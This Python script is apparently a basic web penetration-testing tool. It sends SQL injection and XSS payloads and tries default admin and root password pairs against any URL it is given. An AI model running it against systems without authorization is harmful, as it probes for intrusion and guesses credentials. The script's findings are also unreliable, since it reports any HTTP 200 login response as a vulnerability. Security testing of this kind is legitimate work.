import requests
from urllib.parse import urljoin

# Function to test SQL injection
def test_sql_injection(url):
    print("\nTesting for SQL Injection...\n")
    sql_payloads = [
        "' OR '1'='1",
        "' UNION SELECT null, null, null--",
        "' AND 1=1--",
        "' OR 1=1--"
    ]
    for payload in sql_payloads:
        target_url = f"{url}?id={payload}"
        response = requests.get(target_url)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
            return True
    print("No SQL Injection vulnerabilities detected.")
    return False

# Function to test XSS
def test_xss(url):
    print("\nTesting for Cross-Site Scripting (XSS)...\n")
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>"
    ]
    for payload in xss_payloads:
        response = requests.get(url, params={"input": payload})
        if payload in response.text:
            print(f"Potential XSS vulnerability detected with payload: {payload}")
            return True
    print("No XSS vulnerabilities detected.")
    return False

# Function to test insecure authentication mechanisms
def test_insecure_auth(url):
    print("\nTesting for Insecure Authentication Mechanisms...\n")
    common_usernames = ["admin", "root", "user"]
    common_passwords = ["admin", "password", "123456", "root"]
    login_url = urljoin(url, "/login")  # Assumes a /login endpoint

    for username in common_usernames:
        for password in common_passwords:
            response = requests.post(login_url, data={"username": username, "password": password})
            if "welcome" in response.text.lower() or response.status_code == 200:
                print(f"Potential insecure authentication detected. Credentials: {username}/{password}")
                return True
    print("No insecure authentication vulnerabilities detected.")
    return False

# Main function
def penetration_test():
    print("Web Application Penetration Testing Tool")
    print("========================================\n")

    url = input("Enter the base URL of the web application (e.g., http://example.com): ").strip()

    # Perform tests
    sql_injection_result = test_sql_injection(url)
    xss_result = test_xss(url)
    auth_result = test_insecure_auth(url)

    # Display summary
    print("\nTest Summary:")
    print("============================")
    print(f"SQL Injection: {'Vulnerable' if sql_injection_result else 'Not Vulnerable'}")
    print(f"XSS: {'Vulnerable' if xss_result else 'Not Vulnerable'}")
    print(f"Insecure Authentication: {'Vulnerable' if auth_result else 'Not Vulnerable'}")

if __name__ == "__main__":
    penetration_test()
